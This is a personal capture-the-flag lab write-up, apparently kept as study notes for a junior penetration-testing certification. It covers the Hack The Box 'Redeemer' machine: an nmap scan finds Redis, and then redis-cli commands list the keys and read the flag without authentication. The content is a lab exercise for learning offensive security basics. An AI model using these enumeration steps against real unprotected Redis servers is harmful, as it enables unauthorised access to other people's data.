## Box: [Redeemer] — Started: 2025-10-05 22:10

**IP/Host:** `HTB Attackbox`  |  **Status:** `Owned 25-10-05`

### TL;DR

Initial: `redis-cli -h IPADDR`.
Path to Flag Cap:
**NOTE**: Denoting full path to flag cap here because Redis's command structure is a tad arcane if you're not used to it
- `info` - gets all database information, including the keyspace. Technically, I actually used the `info keyspace` command, which told me the keyspace info more directly
- `select 0` - to select `db0` from the `info keyspace` results
- `KEYS *` - list all keys in currently selected db
- `get flag` - get the string at key named "flag", which was the flag for this box

*Cumulative Impact Overview*:
- `redis-cli` practice

### Exploit Lifecycle

1. *Validation & Recon*: HTB CTF
2. *Enumeration & Scanning*:
    - `nmap -sV -p- 10.129.204.92` - found port 6379, a redis port
3. *Findings & Exploits*:
    - `redis-cli -h IPADDR` - connect to redis host at IPADDR
4. *PrivEsc*: N/A
5. *Post-Exploitation*: 
    - - `info` - gets all database information, including the keyspace. Technically, I actually used the `info keyspace` command, which told me the keyspace info more directly
    - `select 0` - to select `db0` from the `info keyspace` results
    - `KEYS *` - list all keys in currently selected db
    - `get flag` - get the string at key named "flag", which was the flag for this box

*Proof — path to flags/screenshot of boxpwn*:

![[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/VulnBoxes/Hack The Box/Starting Point/z_attachments/Pasted image 20251005220644.png]]

### Findings
Use espanso command, `:finding`, then remove `UNCONFIRMED` as findings are POCd and remove RMRK with remarks

- *UNCONFIRMED - Found*: PORT - IPADDR - 2025-10-04 23:35:22 - RMRK


### Commands Learned or Commands Used
```bash
$ redis-cli -h IPADDR             # connect to host
10.129.157.24:6379> info          # get info on db, can also specify information you need, like `info keyspace`
10.129.157.24:6379> select 0      # select db
10.129.157.24:6379> KEYS *        # list available keys
10.129.157.24:6379> get keyname   # get string of keyname
```

